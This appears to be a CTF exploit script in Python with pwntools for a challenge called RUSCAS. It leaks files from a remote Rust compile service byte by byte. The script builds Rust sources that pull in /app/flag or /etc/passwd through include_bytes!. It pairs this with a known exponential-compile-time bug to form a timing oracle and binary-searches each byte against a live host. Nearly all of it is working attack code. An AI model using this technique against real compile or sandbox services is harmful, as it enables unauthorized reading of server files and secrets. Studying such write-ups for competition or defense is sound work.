from pwn import *
context.log_level = 'warn'

# socat TCP-LISTEN:50806,fork,reuseaddr EXEC:'python3 serve.py' # to test locally

'''
In RUSCAS, we're able to compile Rust code on the server, but not run it.
The include_bytes! macro is able to read a file at compile time.
Based on an initial glance at the provided `serve.py`, I assumed we would get 1 bit of feedback: whether or not the compile succeeded.
Knowing that index-out-of-bounds errors involving a constant cause a compile error, I crafted the following payload, which fails iff the first byte of /etc/passwd is less than or equal to 255:
`rustc <(echo 'fn main() { [0u8; include_bytes!("/etc/passwd")[0] as usize][255]; }')`
Unfortunately, the server doesn't give us a compile-error oracle, the condition is `if res < 0: print("compile failed")`, and error codes are always between 0 and 255 (inclusive).
Looking for a timing issue that I could trigger after the #[deny(const_err)] failure, I ran `rustc +nightly -Z time-passes`, and noticed that the lint failed after `collecting roots`, which is before monomorphization/LLVM.
Searching the rust issue tracker for `is:issue is:open label:I-compiletime monomorphization`, I found issue 54540, which spends an exponential amount of time in monomorphization.
Benchmarking that, it turned out that at 14 iterations of the 54540 poc, a failed compile took around 0.5 seconds, and a successful compile took 2.6 seconds.
This timing oracle, combined with binary search, allowed reading arbitrary files whose paths are known.
From there, the provided Dockerfile told us that `/app/flag` would exist.
'''

def issue_54540_poc(n):
    # https://github.com/rust-lang/rust/issues/54540
    src = '#![recursion_limit = "128"]\n'
    src += '#![type_length_limit = "%d"]\n' % (2**26,)
    src += 'trait CallMe<T: Copy> { fn call_me<F: Fn(T)>(&self, t: T, f: &F); }\n'
    src += 'impl<T: Copy> CallMe<T> for () { fn call_me<F: Fn(T)>(&self, _: T, _: &F) {} }\n'
    src += '#[derive(Default, Debug)] struct S<T>(T, T);\n'
    src += 'impl<T: Copy, P: CallMe<T>> CallMe<T> for S<P> { fn call_me<F: Fn(T)>(&self, t: T, f: &F) { let wrapped = |t: _| { f(t); }; self.0.call_me(t, &wrapped); self.1.call_me(t, &wrapped); } }\n'
    src += 'type S0 = S<()>; '
    for i in range(n):
        src += 'type S%d = S<S%d>; ' % (i+1, i)
    return src + '\n'

def test_char(fname, index, value):
    return issue_54540_poc(19) + 'fn main() { [0u8; include_bytes!("%s")[%d] as usize][%d]; let s = S14::default(); s.call_me((), &|()| ()); }' % (fname, index, value)


import time

#server_ip = '0.0.0.0'
server_ip = 'ruscas.r3kapig.com'

#fname_to_read = '/etc/passwd'
#fname_to_read = '/proc/self/cmdline'
fname_to_read = '/app/flag'

def lsearch(f, lo, hi):
    print('lsearching %d %d' % (lo, hi))
    for i in range(hi-lo+1):
        if not f(hi-i):
            return hi-i+1

def bsearch(f, lo, hi):
    print('bsearching %d %d' % (lo, hi))
    mid = lo + (hi - lo)/2
    if (hi - lo) <= 2:
        return lsearch(f, lo, hi) or mid
    if f(mid):
        return bsearch(f, lo, mid)
    else:
        return bsearch(f, mid, hi)

output = []
for i in range(16):
    def oracle(j):
        start = time.time()
        p = remote(server_ip, 50806)
        p.sendline(test_char(fname_to_read, i, j)+'\nEOF')
        p.recvall(timeout=5)
        end = time.time()
        delta = end-start
        return delta < 1
    output.append(bsearch(oracle, 0, 255))
    print(''.join(map(chr, output)))
